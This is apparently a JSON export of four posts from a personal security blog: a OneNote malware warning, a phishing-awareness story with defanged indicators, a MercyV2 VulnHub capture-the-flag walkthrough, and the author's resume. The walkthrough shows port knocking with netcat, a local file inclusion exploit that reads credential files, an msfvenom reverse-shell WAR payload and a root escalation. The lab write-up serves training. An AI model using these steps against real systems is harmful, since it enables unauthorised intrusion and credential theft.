[{"content":" I\u0026rsquo;d like to bring to your attention a new and dangerous attack vector that is spreading malware through .ONE files. These files, also known as Microsoft OneNote files, may appear to be from a trusted source, but in reality, they can contain malwarel.\nIn recent months, we have seen an increase in the number of threat actor groups utilizing .ONE files as a means to spread malware. Groups such as Async, Qakbot, and Redline are known to have used this technique to target individuals and organizations alike. These groups are constantly evolving their tactics as the ever changing landscape makes old techniques harder, With the recent changes Microsoft made to disable macro\u0026rsquo;s globally we saw these groups pivot once again to an old but successful method for spreading their malicious content.\nWhat sets this attack vector apart from other email-based threats is that the malware in .ONE files is executed instantly when you click on a photo or button in the .one file. Unlike office macros, which require enabling content, this makes the attack vector even more dangerous to unsuspecting users who may not realize they are running a malicious file. I\u0026rsquo;ve seen many samples containing up to 10 different .bat payloads!\nRapid7 covered a redline sample on this!\nTo protect yourself against this threat, I recommend following these tips: General users There are also several steps that can be taken to stay safe from .ONE file malware. Firstly, avoid opening attachments from unknown or untrusted sources. Secondly, be cautious when downloading files, especially those that appear to be from a trusted source. Finally, if you receive a .ONE file from an unknown source or one that appears suspicious, report the email to IT and never open it!\nIT teams There are several simple technical measures that can be taken to limit the impact of .ONE files on the organization. Firstly, configuring email filters to block attachments with the .ONE file extension can help prevent malicious files from reaching employees. Secondly, implementing endpoint protection software with the latest signatures and updates can help detect and prevent malware infections caused by .ONE files. Finally, providing regular security awareness training to employees can help them recognize the signs of a malicious files and avoid falling for social engineering tactics.\nBy following these simple steps, you can help protect yourself and your organization from the dangers of .ONE file malware.\nIn conclusion, the .ONE file malware threat is a serious issue that should not be taken lightly. By following safe security practices and being mindful of email attachments, you can help protect yourself from this dangerous attack vector. As always, if you have any questions or concerns, feel free to reach out!\nMalware samples:\nQakbot: https://bazaar.abuse.ch/sample/9cd900111f019f32112eba2c1ce1ecd9345d05f5d9a8a617c4a609d77cf2f95b/\nRedline: https://bazaar.abuse.ch/sample/bf8c7c35cb5b8f47ad7fe7e89322960e105efa754360953ca854925a6b914092/\nAsync: https://bazaar.abuse.ch/sample/9037e60b24cf0f56cc9e03ea0c2dc2f96180ac160b90c5836e80cc409e6611eb/\n","permalink":"https://hatedpw.github.io/CyberQuackers/posts/onemalwaretorulethemall/","summary":"I\u0026rsquo;d like to bring to your attention a new and dangerous attack vector that is spreading malware through .ONE files. These files, also known as Microsoft OneNote files, may appear to be from a trusted source, but in reality, they can contain malwarel.\nIn recent months, we have seen an increase in the number of threat actor groups utilizing .ONE files as a means to spread malware. Groups such as Async, Qakbot, and Redline are known to have used this technique to target individuals and organizations alike.","title":"One Malware to rule them all"},{"content":"When we think of a company getting breached generally, people think of some advanced attack that took months of planning and execution. But in reality, most breaches are caused by simple mistakes. So in this post, I will be going over a breach that could likely happen in the future and how it could have been prevented.\nSo let us start with the basics. What is a breach? A breach is when an adversary gains access to a system and steals data. This can be done in many ways, but the most common way is through phishing. Phishing is when a threat actor sends a fake email to a user and tricks them into clicking a link or opening an attachment. This is a widespread attack vector that many adversaries consistently use.\nThis story starts with a simple but effective phish.\nYou\u0026rsquo;ve opened up an email, and it\u0026rsquo;s demanding that you sign these important documents that need to be reviewed, and you need to do it now. You click the link and are taken to a legitimate website; This is the official box domain, a trusted domain in which many users share documents all the time. So you let your guard down and read further.\nIt says to click here to read the document. Oh, that\u0026rsquo;s weird.. but is hosted on an official website, it must be fine. So you click the link and are taken to a page that looks like this.\nThis looks like 365 web view for word document editing, but the key difference is the URL. This is not the official portal.office.com URL. This is a URL that is hosted on a domain that Microsoft does not own. This is a phishing site. You are prompted with a login screen, and you enter your credentials. You click login, and nothing happens. It just says error wrong password or email, please try again.\nYou repeat this process a few times, and you get frustrated. You think, \u0026ldquo;I know my password is correct, I just changed it yesterday, and I know my email is correct. I just sent an email to myself to check it. So why is it not working?\u0026rdquo; You then think, \u0026ldquo;Maybe I need to change my password again, maybe I forgot it.\u0026rdquo; But each time you click login. The username and password were sent to the threat actor and saved into their database.\nThe credentials have been stolen, and the threat actor can now login to your account and do whatever they want. So, for example, they can send emails to your contacts, delete your files, and even download them. You might think I am just a low-level person who cares if I get phished, right? Wrong, you have access to very sensitive data, and stealing a single account, even one that isn\u0026rsquo;t important now, can lead to even more significant breaches later down the line through internal phishing attacks and lateral movement inside the network.\nThis is a very simple and straightforward attack used by thousands of adversaries daily. Why? Because it works.\nSo how can we prevent this?\nALWAYS check the URLs; if it doesn\u0026rsquo;t look right, stop and alert your IT Team! Think, should I be getting this email? Does it make any sense? Do I know this person? Communicate with co-workers. Did they receive this to? Why would Jim, the intern get this invoice as well? If you are unsure, don\u0026rsquo;t click the link, don\u0026rsquo;t open the attachment, dont enter your credentials. Report the email to your IT team. They will assist you as it has most likely been sent to everyone around you. The most crucial step is NEVER to feel scared to reach out to your IT team. Everyone, including security professionals, will fall for a phish at some point in their life. All it takes is that you aren\u0026rsquo;t paying attention one time, and boom, you\u0026rsquo;ve just given up your password. Reporting these incidents allows IT staff to investigate and resolve the issue before it can cause damage to the company.\nUnderstand that taking these steps will never fully guarantee your safety from phishing attacks but can help reduce your likelihood of getting phished.\nOkay but what about the billion dollar breach? I was able to obtain access to the database where the passwords for this phish are stored, when I first looked at the list, it only had around 20 email/passwords stored, but only five hours later, it had over 260 stolen credentials. Many of these belonged to managers and staff from companies estimated to have over a billion net worth.\nDon\u0026rsquo;t let this happen to you. Be vigilant and always be on the lookout for phishing emails.\nDisclaimer: I have reported the location where the log files are being held, and until the website is taken down, I am monitoring the data being added to it and will then submit the information to https://haveibeenpwned.com/ to alert users of the breach.\nPhish IOCS:\nhXXps://hulking-citrine-krypton[.]glitch[.]me/flk[.]html hXXps://ssvilvensstokes[.]app[.]box[.]com/notes/1033258185693?s=7b1zk6io9kmxqnau2agt3pr56e6czuwu\n","permalink":"https://hatedpw.github.io/CyberQuackers/posts/a-simple-phish-leads-to-a-billion-dollar-company-being-breached/","summary":"When we think of a company getting breached generally, people think of some advanced attack that took months of planning and execution. But in reality, most breaches are caused by simple mistakes. So in this post, I will be going over a breach that could likely happen in the future and how it could have been prevented.\nSo let us start with the basics. What is a breach? A breach is when an adversary gains access to a system and steals data.","title":"A simple phish leads to a billion dollar company being breached"},{"content":"Earlier this month, I attended a local sec talk. The main event was working to resolve the MercyV2 vulnhub box.\nUnfortunately during the event, I couldn\u0026rsquo;t do the box as mac m1s don\u0026rsquo;t support x86 virtual machines :P So I spent most of the night talking shit and helping teach some new cyber trainees steps on how to enumerate the box. No one finished the box or got close at the event that we know of so when I got home, I took it as a challenge to finish it. MercyV2 is a fun little box that focuses on in-depth enumeration and multi-account escalation. I liked it a lot.\nLet us begin the walkthrough! I begin with a Nmap scan on the device. I usually like to do a quick scan to see what is running.\nNmap 192.168.253.131 open 53/tcp open domain 110/tcp open pop3 139/tcp open netbios-ssn 143/tcp open imap 445/tcp open microsoft-ds 993/tcp open imaps 995/tcp open pop3s 8080/tcp open http-proxy cool so can see a basic range of ports available on this device. Lets scan with nmap again.\nnmap -sC -sV 192.168.253.131 PORT STATE SERVICE VERSION 22/tcp filtered ssh 53/tcp open domain ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.9.5-3ubuntu0.17-Ubuntu 80/tcp filtered http 110/tcp open pop3? 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 143/tcp open imap Dovecot imapdimage.png |_ssl-date: TLS randomness does not represent time 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 993/tcp open ssl/imaps? 995/tcp open ssl/pop3s? 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 | http-methods: |_ Potentially risky methods: PUT DELETE |_http-open-proxy: Proxy might be redirecting requests | http-robots.txt: 1 disallowed entry |_/tryharder/tryharder |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat We get back some good information: Server running ssh, SMB, apache tomcat/Coyote JSP engine 1.1 I dont want to bruteforce this box so ill skip ssh for now. I first want to start with reviewing the URLs that came back. See if any notes could be found there. port 80 is filter, so ignore. 8080 is open lets go check it out.\nSo we confirm its running tomcat. Can see a webapp and a hostmanager! these might be useful later.\nLets check robots. Alright ill bite Cool this looks like a base64 string. Lets slap that into cyberchef.\nSXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg== It\u0026#39;s annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list. Once, we found the password \u0026#34;password\u0026#34;, quite literally sticking on a post-it in front of an employee\u0026#39;s desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her. No fluffy bunnies for those who set insecure passwords and endanger the enterprise. Hmm password\u0026hellip;\u0026hellip; Lets go try that management page.. Welp default stuff failed!\nfurther investigation required. Time to find out more information, we know its a linux machine and SMB so.. enum4linux to the rescue!\n========================================== | Share Enumeration on 192.168.253.131 | ========================================== Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers qiu Disk IPC$ IPC IPC Service (MERCY server (Samba, Ubuntu)) ======================================================================== | Users on 192.168.253.131 via RID cycling (RIDS: 500-550,1000-1050) | ======================================================================== [+] Enumerating users using SID S-1-22-1 and logon username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39; S-1-22-1-1000 Unix User\\pleadformercy (Local User) S-1-22-1-1001 Unix User\\qiu (Local User) S-1-22-1-1002 Unix User\\thisisasuperduperlonguser (Local User) S-1-22-1-1003 Unix User\\fluffy (Local User) Intersting so we have a share qui and 4 users.\npleadformercy qiu thisisasuperduperlonguser fluffy So at this point im wondering, we know from the note that bad password practices have been used before i wonder what i can get into with this. Lets see if the qiu share is useful or not.\nsmbclient \\\\\\\\192.168.253.131\\\\qiu -U qiu Enter WORKGROUP\\qiu\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; Ay lets go, time for scout around. I find a .secret folder time to download it and see whats up.\nreviewing the downloaded files i found a config file.\nHere are settings for your perusal. Port Knocking Daemon Configuration [options] UseSyslog [openHTTP] sequence = 159,27391,4 seq_timeout = 100 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT tcpflags = syn [closeHTTP] sequence = 4,27391,159 seq_timeout = 100 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT tcpflags = syn [openSSH] sequence = 17301,28504,9999 seq_timeout = 100 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9999,28504,17301 seq_timeout = 100 command = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn uh.. what the hell is this? ive never heard of port knocking. Time to google! So basically its a sequence of ports to knock on which will enable access to that port. This is pretty cool. It also explains why nmap returned filtered for port 22 and 80. Meaning that the port is open but the service is not until you knock on the port. From my research i can easily use netcat to do this. Again i only want to do port 80 for now as i want to see how i can get without ssh.\nnc 192.168.253.131 159 nc 192.168.253.131 27391 nc 192.168.253.131 4 Rescanning with nmap we have access to port 80!\nPORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) | http-robots.txt: 2 disallowed entries |_/mercy /nomercy |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Ohhh we got mercy and nomercy directories now. Mercy gives us some text\nWelcome to Mercy! We hope you do not plead for mercy too much. If you do, please help us upgrade our website to allow our visitors to obtain more than just the local time of our system. Meanwhile visting /nomercy Well what the hell is this rips thing. google! Basically its a code analysis tool to detect vulns in php. intersting.. I wonder if there are any exploits for it.\nsearchsploit rips --------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) --------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- RIPS 0.53 - Multiple Local File Inclusions | exploits/php/webapps/18660.txt Rips Scanner 0.5 - \u0026#39;code.php\u0026#39; Local File Inclusion Cool, we got a LFI vuln, my favorite. Its saying to visit ``/windows/code.php?file=Time for some good old burp. I wonder if we can see/etc/passwd![6](../Mercyv2img/m2passwd.png) Nice, earlier on the tomcat info i was reading that usernames and passwords can potentitally be stored intomcat-users.xml``` Ay i see some creds.\nthisisasuperduperlonguser:heartbreakisinevitable fluffy:freakishfluffybunny Maybe we can go back to the admin page and see if we can get in.\nSuperlong user works! Oh cool, a webapp that i can upload stuff to. Time to pop a shell\nSo searching through metasploit i found i can do this a few ways, the first is using exploit/multi/http/tomcat_mgr/upload, second is just uploading a shell manually. i wanted to play more with msfvenom so i decided to use the second method.\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.253.131 LPORT=1234 -f war -o duck.war REMEMBER python -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' MAKES SHELL USABLE. Upload the shell to the webapp and then run it.\nwhoami tomcat7 Well thats fun. We are connected, now to see if we can get root.\nsu into longuser auth fail?? ok\u0026hellip; lets try fluffy\nsu fluffy whoami fluffy We are the bunny. Search around at the files and find .private wonder whats this. Ooooooo we\u0026rsquo;ve got a bash script that is displaying the time.. Seems like when /time is visited it will display the time. this is also ran as root :D\nSo we can get root a few ways i guess.\nput reverse shell into timeclock force sudo for user do some tmp bash root magic.. I havnt done much of the tmp bash magic before so lets explore it.\necho \u0026#34;cp wait a few minutes as visiting /time doesnt instantly trigger woo!\nid uid=1003(fluffy) gid=1003(fluffy) euid=0(root) groups=0(root),groups=1003(fluffy) we are root :D scan for flag.\ncat author-secret.txt Hi! Congratulations on being able to root MERCY. The author feels bittersweet about this box. On one hand, it was a box designed as a dedication to the sufferance put through by the Offensive Security team for PWK. I thought I would pay it forward by creating a vulnerable machine too. This is not meant to be a particularly difficult machine, but is meant to bring you through a good number of enumerative steps through a variety of techniques. The author would also like to thank a great friend who he always teases as \u0026#34;plead for mercy\u0026#34;. She has been awesome. The author, in particular, appreciates her great heart, candour, and her willingness to listen to the author\u0026#39;s rants and troubles. The author will stay forever grateful for her presence. She never needed to be this friendly to the author. The author, as \u0026#34;plead for mercy\u0026#34; knows, is terrible at any sort of dedication or gifting, and so the best the author could do, I guess, is a little present, which explains the hostname of this box. (You might also have been pleading for mercy trying to root this box, considering its design.) You\u0026#39;ll always be remembered, \u0026#34;plead for mercy\u0026#34;, and Offensive Security, for making me plead for mercy! Congratulations, once again, for you TRIED HARDER! Regards, The Author What a fun box.\n","permalink":"https://hatedpw.github.io/CyberQuackers/posts/MercyV2WalkThrough/","summary":"Earlier this month, I attended a local sec talk. The main event was working to resolve the MercyV2 vulnhub box.\nUnfortunately during the event, I couldn\u0026rsquo;t do the box as mac m1s don\u0026rsquo;t support x86 virtual machines :P So I spent most of the night talking shit and helping teach some new cyber trainees steps on how to enumerate the box. No one finished the box or got close at the event that we know of so when I got home, I took it as a challenge to finish it.","title":"MercyV2WalkThrough"},{"content":"I am a highly skilled and experienced professional with a diverse background in various technical fields, including Threat analysis, DevOps, penetration testing, and incident response. My strong foundation in programming has allowed me to automate tasks and processes, increasing efficiency for my teams. As a specialised generalist, I am able to adapt to new environments and confidently tackle a wide range of challenges.\nIn addition to my technical expertise, I have significant experience in management. I have led and mentored teams, developed and implemented processes, and driven projects to successful completion. My leadership skills, combined with my technical expertise, make me a valuable asset to any organisation.\nCan see some blogs i posted at work:\nDouble Trouble: Unmasking The EPOS Net Phishing Scheme That Turns Trust Against You\nUsually can be found doing CTF Challenges Cert training\nCoding dumb projects Reversing Malware\nCerts Currently working on obtaining PNPT by TCMSecurity AWS Cloud Practitioner Certificate\nAZ-104 Microsoft Azure Administrator\nCCNA\nWatchguard Network Security Essentials Training\nJr Penetration Tester (TryHackMe)\nCoding languages C / Golang / Python.\nC for low level fun.\nPython for POC/quick automation\nGolang for making POCs more presentable, although i have barely had time to refactor my code from python to Golang lately.\nWork History Ive worked in many fields\u0026hellip; Im listing them from most recent to least recent.\nCurrent - Threat Analyst - Cofense:\n-Developed custom python scripts to reduce manual effort for APAC threat analysts, resulting in a daily time saving of 30 minutes per team member. -Performed Dynamic and static malware analysis. -Utilised expertise in Yara rule development to enhance automated detection in the triage system. -Monitor Triage systems for new customer-reported suspicious emails and perform initial assessments to determine if they pose a threat to the customer or are benign.\n9 Months - Graduate Cloud Security Engineer - Fircy:\n-Assisted in development of threat research MVP using Python, AWS, public API, and open-source intelligence.\n-Created terraform/python automation to speed up security infrastructure deployment, saving time and eliminating repetitive tasks.\n-Conducted thorough post-incident investigations in AWS to ensure accurate analysis.\n-Conducted comprehensive cloud penetration tests using manual and automated tooling, including enumeration and report generation.\n-Curated and delivered comprehensive security course content and training materials, providing onsite support to ensure high engagement.\n-Delivered an interactive product demo and raised product awareness at the AISA AdelaideSec conference\n9 Month - Support Engineer - Control Z\n-Developed custom python automation scripts and workflow tasks that streamlined ticket processing, resulting in a 25% reduction in processing time.\n-Client facing SME service desk, working through support tickets while meeting strict SLA and high KPI.\n-Created over ten knowledge base articles for staff professional development.\n-Managed Microsoft Azure, 365, and on-premises services, including training, installation, troubleshooting, and on-going maintenance\n-Led investigations and resolutions of monitoring alerts, utilising strong problem-solving and communication skills\n-Configured and maintained VPN and VoIP systems, ensuring reliable remote access and clear voice communication. Troubleshoot issues and provided timely resolution to maintain uninterrupted service.\n4 Years as a Coaching video games:\n-Worked with over 600 individuals and 15 Professional Teams.\n-Communication building within fast pace competitive environments.\n-Designed training and professional development programs to enhance strengths and identify weaknesses within the team and individual players.\n-Analytical video review finding patterns, trends and outliers.\n-Six top 2 professional League finishes across Oceania, Europe, North and South America.\n7 years as a Event manager:\n-Organised and managed over 30 small to large events, successfully coordinating logistics and staff for events with up to 250 participants\n-Led and managed staff teams of 3-45 people in all stages of event planning and execution, ensuring smooth and successful events\n","permalink":"https://hatedpw.github.io/CyberQuackers/posts/WhoTheQuackAreYou/","summary":"I am a highly skilled and experienced professional with a diverse background in various technical fields, including Threat analysis, DevOps, penetration testing, and incident response. My strong foundation in programming has allowed me to automate tasks and processes, increasing efficiency for my teams. As a specialised generalist, I am able to adapt to new environments and confidently tackle a wide range of challenges.\nIn addition to my technical expertise, I have significant experience in management.","title":"Who the Quack are you?"}]